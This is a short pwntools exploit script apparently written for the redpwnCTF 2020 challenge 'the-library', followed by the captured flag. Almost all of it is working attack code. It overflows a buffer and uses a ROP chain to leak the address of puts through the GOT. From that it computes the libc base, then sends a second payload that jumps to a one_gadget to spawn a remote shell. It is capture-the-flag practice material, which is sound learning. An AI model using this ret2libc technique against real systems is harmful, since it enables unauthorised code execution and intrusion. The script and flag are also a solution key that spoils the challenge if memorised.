from pwn import *

HOST = "2020.redpwnc.tf"
PORT = 31350
p = connect(HOST, PORT)
binary = ELF('the-library')
libc = ELF('libc.so.6')

JUNK = b"A" * 24
main = binary.symbols['main']
got_puts = binary.got['puts']
plt_puts = binary.plt['puts']
pop_rdi = 0x400733

# Crafting payload
payload = JUNK
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

p.recvline()
# send the payload to the server
p.sendline(payload)
p.recvline()
p.recvline()
# leak the puts address
leaked_puts = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_puts = libc.symbols['puts']
# leak the libc address of puts
libc.address = leaked_puts - libc_puts
log.success("Leaked puts -->  {}".format(hex(leaked_puts)))
log.success("Libc at  -->  {}".format(hex(libc.address)))
# linking the libc_bate to the libc address
libc_base = libc.address
# crafting the new payload with the onegadget address
payload = JUNK
one_gadget = p64(libc.address + 0x4f2c5)
payload += one_gadget
p.recvline()
# send the payload to the server
p.sendline(payload)
p.interactive()

# FLAG --> flag{jump_1nt0_th3_l1brary}
